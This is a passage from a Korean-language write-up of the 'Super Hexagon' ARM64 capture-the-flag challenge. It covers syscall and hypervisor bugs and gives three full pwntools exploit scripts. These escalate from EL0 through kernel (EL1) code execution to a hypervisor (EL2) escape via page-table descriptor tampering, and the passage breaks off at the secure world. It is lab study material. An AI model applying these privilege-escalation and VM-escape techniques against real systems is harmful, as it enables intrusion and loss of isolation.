관련 처리 로직이니 나중에 분석한다. sys_read는 위 0xffffffffc9000000을 읽는다. IPA는 0x3b000이며 PA는 0x9000000이다. 여긴 UART 공간이다. Memory mapped io (MMIO) 방식이다. DMA와 함께 쓰인다. sys_read는 내부적으로 1 바이트씩 여기서 읽고 리턴한다.\n... /* read */ usr = x2; if (x8 == 0x3f) { if (x2 != (undefined *)0x0) { iVar3 = FUN_ffffffffc0009ad8(); if (iVar3 \u0026lt; 0) { usr = (undefined *)0xffffffffffffffff; } else { *x1 = (char)iVar3; usr = (undefined *)0x1; } } } else { /* write */ if (x8 == 0x40) { for (usr_page = (undefined *)0x0; usr_page \u0026lt; x2; usr_page = usr_page + 1) { FUN_ffffffffc0009aa4(usr_page[(long)x1]); } } else { if (x8 == 0x5d) { /* WARNING: Subroutine does not return */ FUN_ffffffffc00091b0(); } /* mmap */ if (x8 == 0xde) { if (x0 == 0) { if (((ulong)x1 \u0026amp; 0xfff) == 0) { usr = (undefined *)FUN_ffffffffc00086e8(x1); if (usr != (undefined *)0xffffffffffffffff) { phys = FUN_ffffffffc0008530(x1); for (usr_page = usr; usr_page \u0026lt; x1 + (long)usr; usr_page = usr_page + 0x1000) { FUN_ffffffffc0008864(usr_page,usr_page + (phys - (long)usr),(ulong)x2 \u0026amp; 0xffffffff ); ... 처음에는 눈치를 못챘지만 모든 구현된 시스템 콜들을 분석하고 나서 다시 코드를 처음부터 봤더니 이상함을 느꼈다. 왜냐하면 ELx에서의 가상 주소 액세스는 분명 ELx의 translation table base address를 타고 변환될텐데 x1에 대한 privileged, unprivileged 체크가 없었기 때문이다. 다른 시스템 콜들의 경우 아래와 같이 1 단계 변환후 attribute를 비교해서 user memory인지 아닌지를 검사한다. ret 1 byte overwrite → print_flag ropper로 쭉 뽑고 보다가 0xffffffffc0009130를 쓸 수 있을 것 같아서 확인해보았다.\nfffc0009130 fc 7f 40 f9 ldr x28 ,[sp, #0xf8 ] fffc0009134 1c 41 18 d5 msr sp_el0 ,x28 fffc0009138 fc 77 4e a9 ldp x28 ,x29 ,[sp, #param_24 ] fffc000913c c0 03 5f d6 ret 삽질하다가 메뉴얼을 뒤져보니 다음과 같이 UNDEFINED로 정의되어있었다. handler가 SP_ELxh에서 SP_ELxt로 최대한 빨리 전환을 시도하기에 절대 쓸 수 없는 가젯이다.\nfffc0009430 f3 53 41 a9 ldp x19 ,x20 ,[sp, #local_10 ] fffc0009434 fd 7b c2 a8 ldp x29 =\u0026gt;local_20 ,x30 ,[sp], #0x20 fffc0009438 c0 03 5f d6 ret 더 찾다가 위 가젯을 찾았다. sp+80에 연속적으로 쓸 수 있으니 저기부터 흐름을 두 번 연속으로 변조하면 pc 컨트롤이 가능하다. Exploit code (flag) from pwn import * from keystone import * sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) context.binary = e = ELF(\u0026#39;./super_hexagon/share/_bios.bin.extracted/BC010\u0026#39;) ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN) sc_st = 0x7ffeffffd006 shellcode = b\u0026#39;\u0026#39; shellcode += bytes(ks.asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 mov w9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #0x1000 bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 mov x8, #0xe2 svc #0x1337 blr x11 \u0026#39;\u0026#39;\u0026#39;)[0]) assert b\u0026#39;\\r\u0026#39; not in shellcode and b\u0026#39;\\x0a\u0026#39; not in shellcode p = remote(\u0026#39;localhost\u0026#39;,6666) payload = b\u0026#39;A\u0026#39; * 0x100 payload += p64(0xdeadbeef) payload += p64(e.sym.gets) # cmd = 1 sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0)) sla(b\u0026#39;key: \u0026#39;, payload) sleep(0.1) payload = b\u0026#39;A\u0026#39; * 0b101 + b\u0026#39;\\x00\u0026#39; payload += shellcode p.sendline(payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0x1000)) payload = b\u0026#39;\u0026#39; payload += b\u0026#39;A\u0026#39;*0b101 + b\u0026#39;\\x00\u0026#39; payload += b\u0026#39;A\u0026#39;*(0x100 - len(payload)) payload += p64(0xdeadbeef) payload += p64(e.sym.mprotect) payload += p64(sc_st) sla(b\u0026#39;key: \u0026#39;, payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(1)) sleep(0.1) stack_x29_x30 = 0xffffffffc0019bb0 addr = stack_x29_x30+0x50 ret = stack_x29_x30 + 8 + 1 ropchain = b\u0026#39;\u0026#39; ropchain += p64(0) # x29 ropchain += p64(0xffffffffc000847c) # x30 # 0xffffffffc000847c: mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret; ropchain += p64(0x00007ffeffffe000) # x19 [EL0/R-X EL1/R-- ACCESSED GLOBAL] ropchain += p64(0xdeadbeef) # x20 ropchain += p64(0) #x29 ropchain += p64(0xffffffffc0008408+ 4) # this will raise exception after ret cnt = len(ropchain)# sfp shellcode = f\u0026#39;\u0026#39;\u0026#39;\\ movz x11, #{((addr)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((addr)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((addr)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(addr)\u0026amp;0xffff}, lsl #0 mov x9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #{cnt} bne loop movz x11, #{((ret)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((ret)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((ret)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(ret)\u0026amp;0xffff}, lsl #0 mov x0, #0 mov x1, x11 mov x2, #1 svc #0x1337 \u0026#39;\u0026#39;\u0026#39; payload = bytes(ks.asm(shellcode)[0]) payload += b\u0026#39;\\x41\u0026#39; * (0x1000 - len(payload)) p.send(payload) sleep(0.1) p.send(ropchain) sleep(0.1) p.send(b\u0026#39;\\x94\u0026#39;) p.interactive() Gaining code execution Arm manual 정리하면서 page descriptor도 정리했다. Two VA ranges를 지원할 때 translation 과정은 stage 1과 stage 2로 나뉜다. VA → IPA → PA 중에 실질적으로 공격할 수 있는건 IPA까지여서 VA → IPA를 속여서 공격하는 것을 생각해볼 수 있다. 이는 VA → IPA의 매핑 관계가 EL1의 영역에 존재하기에 가능하다. 잘 조작해서 임의 VA에 대해서 원하는 IPA로 매핑할 수 있다면, EL0 쪽 메모리와 매핑시켜 특권 레벨에서 code execution이 가능하다. PAN을 확인해봤는데 PAN이 비활성화되어 있었으니 그냥 userland에 fake page table을 준비해두고 초기 코드에 TTBR에 대한 할당을 수행하는 특권 명령을 실행하는데 여기로 점프하면 임의 코드 실행을 얻을 수 있을 것 같았다. 혹시 MMU 킨 상태에선 TTBR1에 대한 할당이 트랩을 일으킬까봐 메뉴얼을 봤더니 따로 그런 검증 로직은 없는 것으로 보인다.\nfffc000000c 20 20 18 d5 msr ttbr1_el1 ,x0 fffc0000010 00 02 80 d2 mov x0,#0x10 fffc0000014 00 02 b0 f2 movk x0,#0x8010 , LSL #16 fffc0000018 00 0c c0 f2 movk x0,#0x60 , LSL #32 fffc000001c 40 20 18 d5 msr tcr_el1 ,x0 fffc0000020 df 3f 03 d5 isb fffc0000024 00 10 38 d5 mrs x0,sctlr_el1 fffc0000028 00 00 40 b2 orr x0,x0,#0x1 fffc000002c 00 10 18 d5 msr sctlr_el1 ,x0 fffc0000030 df 3f 03 d5 isb fffc0000034 e0 87 62 b2 orr x0,xzr ,#-0x40000000 fffc0000038 41 fe 03 10 adr x1,-0x3fff8000 fffc000003c 00 00 01 8b add x0,x0,x1 fffc0000040 00 00 1f d6 br x0=\u0026gt;LAB_ffffffff80008000 어차피 TTBR1_EL1 바꾸면 두 번째 VA가 TTBR1 타고 변환하니 fault 안만들고 그냥 안정적으로 임의 코드 실행을 달성할 수 있을 것 같다. 근데 유저랜드에서 fake page table 만들려면 4kb 이상의 방대한 메모리가 필요하고, 하나 하나 다시 써야한다.\n그래서 read로 EL1의 PTE를 덮어서 IPA를 바꿔주는 것을 선택했다. 아니면 유저쪽 PXN 비트를 떨구고 거기로 뛰어도 된다고 한다. 그게 더 간단하지만 풀 때는 그 생각을 못했다.\n\u0026gt;\u0026gt;\u0026gt; int(bin(0xffffffffc001e000)[2:][::-1][12:21][::-1],2) 30 0xffffffffc001e000 -\u0026gt; 0x1e000 -\u0026gt; 0x4001e000로 변환되니까 저 부분을 수정하면 된다.\n0x0040000000036483로 바꿔주면 미리 mmap 해놓은 유저 페이지를 실행하게 된다. PTE 수정하려면 2바이트가 필요한데 read는 한번에 1바이트씩만 쓸 수 있다. 1바이트만 달라져도 qemu에서 tlb 자체를 완전한 환경에 맞춰 구현하지 않아 바로 fault가 발생한다.\n그래서 저 페이지 테이블 자체를 가리키는 descriptor의 AP를 변경해서 EL0에서 RW를 만들었다. 그리고 EL0에서 8바이트 전체를 써주는 방식으로 진행하면 될것 같았다. mprotect R-X를 해줘야 EL2 MMU에 변경된 execution 권한이 적용된다. FEAT_XNX가 비활성화 상태이다. page descriptor 53 bit가 res0이고 54bit가 EL0과 EL1에 대한 execution control을 담당한다. EL2는 물리 메모리로 접근하고 손으로 pagewalk해서 확인해보았다. mprotect r-x 안했을때 stage 2 translation의 주체인 EL2의 page table에 EL0/1 execution이 비활성화 되었음을 알 수 있다. bata24 gef를 이용하고 있는데 버그가 있다.\n1) 0x0000000000034000-0x0000000000037000 0x0000000040034000-0x0000000040037000 0x3000 0x1000 3 [EL0/R-X EL1/R-X ACCESSED] 2) 0x0000000000036000-0x000000000003b000 0x0000000040036000-0x000000004003b000 0x5000 0x1000 5 [EL0/RWX EL1/RWX ACCESSED] 1번이 mprotect r-x 해줬을 때 gef가 보여주는 EL2 매핑이다. 2번이 mprotect 안해줬을 때 gef가 보여주는 EL2 매핑이다. gef 코드를 보니 따로 WXN는 신경을 쓰는데, FEAT_XNX는 stage 2라서 그런지 따로 확인하지 않는다. 실제로 2번은 EL2에서 RWX가 아니라 RW로 봐야한다.\nExploit code (code execution) from pwn import * from keystone import * sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) context.binary = e = ELF(\u0026#39;./super_hexagon/share/_bios.bin.extracted/BC010\u0026#39;) ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN) sc_st = 0x7ffeffffd006 shellcode = b\u0026#39;\u0026#39; shellcode += bytes(ks.asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 mov w9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #0x1000 bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 mov x8, #0xe2 svc #0x1337 blr x11 \u0026#39;\u0026#39;\u0026#39;)[0]) assert b\u0026#39;\\r\u0026#39; not in shellcode and b\u0026#39;\\x0a\u0026#39; not in shellcode p = remote(\u0026#39;localhost\u0026#39;,6666) payload = b\u0026#39;A\u0026#39; * 0x100 payload += p64(0xdeadbeef) payload += p64(e.sym.gets) # cmd = 1 sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0)) sla(b\u0026#39;key: \u0026#39;, payload) sleep(0.1) payload = b\u0026#39;A\u0026#39; * 0b101 + b\u0026#39;\\x00\u0026#39; payload += shellcode p.sendline(payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0x1000)) payload = b\u0026#39;\u0026#39; payload += b\u0026#39;A\u0026#39;*0b101 + b\u0026#39;\\x00\u0026#39; payload += b\u0026#39;A\u0026#39;*(0x100 - len(payload)) payload += p64(0xdeadbeef) payload += p64(e.sym.mprotect) payload += p64(sc_st) sla(b\u0026#39;key: \u0026#39;, payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(1)) sleep(0.1) entry = 0xffffffffc001e000 + 0xf0 addr = 0xffffffffc00091b8 UART= 0xffffffffc9000000 EL1_shellcode = asm(f\u0026#39;nop\u0026#39;)*(0x400//4) EL1_shellcode += asm(f\u0026#39;\u0026#39;\u0026#39;\\ movz x11, #{((UART)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((UART)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((UART)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(UART)\u0026amp;0xffff}, lsl #0 mov x0, #0x31 strb w0, [x11] ret \u0026#39;\u0026#39;\u0026#39;) cnt = len(EL1_shellcode) val = 0x0040000000036483 shellcode = f\u0026#39;\u0026#39;\u0026#39;\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 // IPA 0x36000 mov x9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #{cnt} bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 // r-x mov x8, #0xe2 svc #0x1337 movz x11, #{((entry)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((entry)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((entry)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(entry)\u0026amp;0xffff}, lsl #0 mov x0, #0 mov x1, x11 mov x8, #0x3f mov x2, #1 svc #0x1337 // now we can modify the kernel page table movz x10, #{((val)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x10, #{((val)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x10, #{((val)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x10, #{(val)\u0026amp;0xffff}, lsl #0 sub x11, x11, #0xa0 str x10, [x11] mov x8, #0x123 svc #0x1337 \u0026#39;\u0026#39;\u0026#39; payload = bytes(ks.asm(shellcode)[0]) payload += b\u0026#39;\\x41\u0026#39; * (0x1000 - len(payload)) p.send(payload) sleep(0.1) p.send(EL1_shellcode) pause() p.send(b\u0026#39;\\x43\u0026#39;) # AP 01 -\u0026gt; EL0 RW EL1 RW p.interactive() \u0026#39;\u0026#39;\u0026#39;[+] LEVEL0_BIT_RANGE: [39, 48] [+] LEVEL1_BIT_RANGE: [30, 39] [+] LEVEL2_BIT_RANGE: [21, 30] [+] LEVEL3_BIT_RANGE: [12, 21] [+] OFFSET_BIT_RANGE: [0, 12] x/40xg 0xffffffffc0000000 + 0x28000 + 8*506\u0026#39;\u0026#39;\u0026#39; 테스트를 위해 1을 계속 찍는 쉘코드를 넣었다.\nEL2, Virtual machine monitor 커널까지 공격했으니 이제 hypervisor를 공격해서 vm escape를 해서 Normal world를 모두 컨트롤할 수 있도록 만들어야한다. 원래 EL1에서 EL3로 secure monitor call을 하는것도 EL2를 거쳐서 처리되기 때문에 여기를 공격 타겟으로 잡아야한다. 이 문제에선 Type 1 hypervisor를 채택한 구조다. 만약 Type 2 구조조였다면 공격 벡터를 추가적으로 저 highvisor 부분으로도 신경을 썼어야 하지 않았을까 생각한다.\nulong FUN_401003d8(long *saved_reg) { long lVar1; ulong x1; int EC_; ulong EC; long x0; ulong ESR; ESR = esr_el2; EC = ESR \u0026gt;\u0026gt; 26 \u0026amp; 0x3f; x0 = *saved_reg; x1 = saved_reg[1]; EC_ = (int)EC; if (EC_ == 0b00010110) { if (x0 == 1) { x1 = HVC_handler(x1,saved_reg[2],saved_reg[2],saved_reg[3]); } else { x0 = -1; } } else if (EC_ == 0b00010111) { if (x0 == 0x83000003) { if (x1 \u0026lt; 0x3c001) { x0 = SMC_handler(0x83000003,x1 + 0x40000000); } else { x0 = -1; } } else { x0 = SMC_handler(x0,x1); } lVar1 = elr_el2; x1 = lVar1 + 4; /* terminate */ elr_el2 = x1; } else { FUN_40101020(s_EC_=_%08x,_ISS_=_%08x_401021a8,EC,(uint)ESR \u0026amp; 0xffffff); x1 = FUN_401009c8(); } *saved_reg = x0; return x1; } 이전에 spsel = 0으로 해주고 위 함수로 점프한다. EL1에서 smc를 통해 secure monitor를 call 할 수 있던 이유는 여기서 저런식으로 따로 핸들링을 다시 해줬기 때문이였다. EL1에서 mmap, mprotect 핸들링시에 hypercall로 EL2를 부르는데 EL2는 여기서 EL2 page table을 변경한다.\nundefined * HVC_handler(ulong x1,ulong x2) { undefined *puVar1; ulong uVar2; ulong idx_addr; idx_addr = x1 \u0026gt;\u0026gt; 12 \u0026amp; 0b0000000111111111; if (x1 == 0x3b000) { *(undefined8 *)(\u0026amp;DAT_40107000 + (idx_addr + (x1 \u0026gt;\u0026gt; 21) * 0x200) * 8) = 0x400000090004c3; return \u0026amp;DAT_40107000; } if (x1 \u0026lt; 0x3c000) { /* x1 \u0026lt; 0xc000 and must not be writable */ if ((x1 \u0026lt; 0xc000) \u0026amp;\u0026amp; (((uint)x2 \u0026gt;\u0026gt; 7 \u0026amp; 1) != 0)) { FUN_4010009c(s__[VMM]_try_to_map_writable_pages_40102130); FUN_401006a8(); FUN_40100774(); } else { /* (el0/el1 execution) and (no write) */ if ((x2 \u0026amp; 0x40000000000080) != 0x80) { /* ? IPA influences the determination of the PA. */ puVar1 = (undefined *)(x1 + 0x40000000 | x2); *(undefined **)(\u0026amp;DAT_40107000 + (idx_addr + (x1 \u0026gt;\u0026gt; 21) * 0x200) * 8) = puVar1; /* level2 descriptor n = 21 */ return puVar1; } } FUN_4010009c(s__[VMM]_RWX_pages_are_not_allowed_40102168); FUN_401006a8(); FUN_40100774(); } FUN_4010009c(s__[VMM]_Invalid_IPA_40102190); FUN_401006a8(); FUN_40100774(); FUN_401009e4(\u0026amp;DAT_40106000,0,0x1000); FUN_401009e4(\u0026amp;DAT_40107000,0,0x8000); for (idx_addr = 0; idx_addr \u0026lt; 0x200000; idx_addr = idx_addr + 0x200000) { uVar2 = idx_addr \u0026gt;\u0026gt; 0x15 \u0026amp; 0x1ff; ... 분석하다가 얼마 안돼서 뭔가 이상함을 발견했다. 애초에 쓰는게 descriptor인데 IPA가 PA에 저렇게 raw하게 영향을 주면 안된다는 것을 깨달았다. 그리고 이 취약점을 이용하면 0x3c000보다 작은 임의 IPA에 대해 할당하고 PA를 매핑할 때 S2AP는 하위 1바이트안에 들어가니 이를 이용해 RWX 페이지를 매핑할 수 있다는 것을 알았다. 근데 IPA는 EL1에서 임의 코드 실행을 달성한 순간부터 원하는 VA와 매핑할 수 있다. 사실 익스플로잇 방식은 추가적으로 찾아봤을때 유사한것으로 보인다. 위 그림에서 설명하는건 일종의 mitigation이긴 하다. EL2에서 취약점은 IPA갖고 엔트리의 플래그가 바뀌는 취약점으로 인해 위 사진과는 다르게 권한 고정이 애초에 실패한 문제가 생겼다. 하이퍼바이저쪽 페이지 권한이 컨트롤 가능하다면, 사실상 IPA는 이미 컨트롤가능하니 이걸로 이전과 똑같이 공격을 하면 된다.\n마저 익스플로잇 전략을 설명하자면 hypercall handler가 위치한 페이지를 바꿔치기해서 다음과 같이 해준다.\nEL1에서 EL0쪽 PTE를 변조해서 특정 IPA를 가리키도록 하고 AP 01로 설정한다. hvc로 변조한 특정 IPA를 hypervisor의 handler 코드 페이지를 가리키는 PA로 세팅하고 S2AP 11로 설정한다. EL2 shellcode를 EL2 0x40102000에 복사한다. 참고로 gef pagewalk가 권한을 틀리게 보여줘서 직접 손으로 pagewalk해서 확인했다. Exploit code (flag \u0026amp; code execution) from pwn import * from keystone import * sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) context.binary = e = ELF(\u0026#39;./super_hexagon/share/_bios.bin.extracted/BC010\u0026#39;) ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN) sc_st = 0x7ffeffffd006 shellcode = b\u0026#39;\u0026#39; shellcode += bytes(ks.asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 mov w9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #0x1000 bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 mov x8, #0xe2 svc #0x1337 blr x11 \u0026#39;\u0026#39;\u0026#39;)[0]) assert b\u0026#39;\\r\u0026#39; not in shellcode and b\u0026#39;\\x0a\u0026#39; not in shellcode p = remote(\u0026#39;localhost\u0026#39;,6666) payload = b\u0026#39;A\u0026#39; * 0x100 payload += p64(0xdeadbeef) payload += p64(e.sym.gets) # cmd = 1 sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0)) sla(b\u0026#39;key: \u0026#39;, payload) sleep(0.1) payload = b\u0026#39;A\u0026#39; * 0b101 + b\u0026#39;\\x00\u0026#39; payload += shellcode p.sendline(payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0x1000)) payload = b\u0026#39;\u0026#39; payload += b\u0026#39;A\u0026#39;*0b101 + b\u0026#39;\\x00\u0026#39; payload += b\u0026#39;A\u0026#39;*(0x100 - len(payload)) payload += p64(0xdeadbeef) payload += p64(e.sym.mprotect) payload += p64(sc_st) sla(b\u0026#39;key: \u0026#39;, payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(1)) sleep(0.1) UART= 0x0000000009000000 read_flag = [1, 252, 59, 213, 1, 0, 0, 185, 33, 252, 59, 213, 1, 4, 0, 185, 65, 252, 59, 213, 1, 8, 0, 185, 97, 252, 59, 213, 1, 12, 0, 185, 129, 252, 59, 213, 1, 16, 0, 185, 161, 252, 59, 213, 1, 20, 0, 185, 193, 252, 59, 213, 1, 24, 0, 185, 225, 252, 59, 213, 1, 28, 0, 185] EL2_shellcode = asm(f\u0026#39;\u0026#39;\u0026#39;\\ movz x11, #{((UART)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((UART)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((UART)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(UART)\u0026amp;0xffff}, lsl #0 mov x0, sp \u0026#39;\u0026#39;\u0026#39;) + bytes(read_flag) + asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x9, #0 loop: add x0, sp, x9 ldrb w0, [x0] strb w0, [x11] add x9, x9, #1 cmp x9, #32 bne loop \u0026#39;\u0026#39;\u0026#39;) EL2_shellcode = b\u0026#39;\\x41\u0026#39;*0xc+EL2_shellcode entry = 0xffffffffc001e000 + 0xf0 addr = 0xffffffffc00091b8 IPA = 0x2400 | (0b11\u0026lt;\u0026lt;6) # s2ap 11 DESC = 3 | 0x100000 EL2_TEXT = 0x00007ffeffffa000 entry_user = 0xffffffffc0028000 + 0xfd0 user_val = 0x2403 | 64 | 0x0020000000000000# ap 01 EL2_shellcode_addr = 0x7ffeffffc100 EL1_shellcode = asm(f\u0026#39;nop\u0026#39;)*(0x400//4) EL1_shellcode += asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x0, #1 movz x1, #{((IPA)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x1, #{((IPA)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x1, #{((IPA)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x1, #{(IPA)\u0026amp;0xffff}, lsl #0 movz x2, #{((DESC)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x2, #{((DESC)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x2, #{((DESC)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x2, #{(DESC)\u0026amp;0xffff}, lsl #0 hvc #0x1337 // PA 0x0000000040102000 RWX movz x11, #{((entry_user)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((entry_user)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((entry_user)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(entry_user)\u0026amp;0xffff}, lsl #0 movz x10, #{((user_val)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x10, #{((user_val)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x10, #{((user_val)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x10, #{(user_val)\u0026amp;0xffff}, lsl #0 str x10, [x11] // IPA 0x0000000000002000 RW movz x11, #{((EL2_TEXT)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((EL2_TEXT)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((EL2_TEXT)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(EL2_TEXT)\u0026amp;0xffff}, lsl #0 movz x12, #{((EL2_shellcode_addr)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x12, #{((EL2_shellcode_addr)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x12, #{((EL2_shellcode_addr)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x12, #{(EL2_shellcode_addr)\u0026amp;0xffff}, lsl #0 mov x9, #0x0 loop: add x2, x11, x9 add x1, x12, x9 ldrb w0, [x1] strb w0, [x2] add w9, w9, #1 cmp x9, #{len(EL2_shellcode)} bne loop hvc #0x1337 // trigger!!! \u0026#39;\u0026#39;\u0026#39;) cnt = len(EL1_shellcode) val = 0x0040000000036483 shellcode = f\u0026#39;\u0026#39;\u0026#39;\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 // IPA 0x36000 mov x9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #{cnt} bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 // r-x mov x8, #0xe2 svc #0x1337 mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 // IPA 0x37000 movz x11, #{((entry)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((entry)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((entry)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(entry)\u0026amp;0xffff}, lsl #0 mov x0, #0 mov x1, x11 mov x8, #0x3f mov x2, #1 svc #0x1337 // now we can modify the kernel page table movz x10, #{((val)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x10, #{((val)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x10, #{((val)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x10, #{(val)\u0026amp;0xffff}, lsl #0 sub x11, x11, #0xa0 str x10, [x11] mov x8, #0x123 svc #0x1337 \u0026#39;\u0026#39;\u0026#39; payload = bytes(ks.asm(shellcode)[0]) payload += b\u0026#39;\\x41\u0026#39; * (0x100 - len(payload)) payload += EL2_shellcode payload += b\u0026#39;\\x41\u0026#39; * (0x1000 - len(payload)) p.send(payload) sleep(0.1) p.send(EL1_shellcode) sleep(0.1) pause() p.send(b\u0026#39;\\x43\u0026#39;) # AP 01 -\u0026gt; EL0 RW EL1 RW sleep(0.1) p.interactive() Exploring the Secure world Normal world의 최고 exception level까진 도달했다. non-secure physical memory의 모든 부분이 제어 가능하다. 이제 secure world로 넘어가야한다. 전에 arm trustzone 관련해서 메뉴얼을 정리하면서 어떻게 trustzone이 메모리 격리를 유지하는지에 대해서 설명했었다. 간단하게 리마인드하자면 ARM CPU는 NS 비트를 하드웨어적으로 지원해서 메모리 격리를 유지하고 캐시 라인에서도 NS를 추가하면 따로 tlb flush도 안해도 되는식으로 구현을 했다. ARM CPU는 SMMU를 통해 Non-secure world에서의 장치 액세스를 막아서 실질적으로 Secure world도 점거해야 중요한 장치를 공격할 수 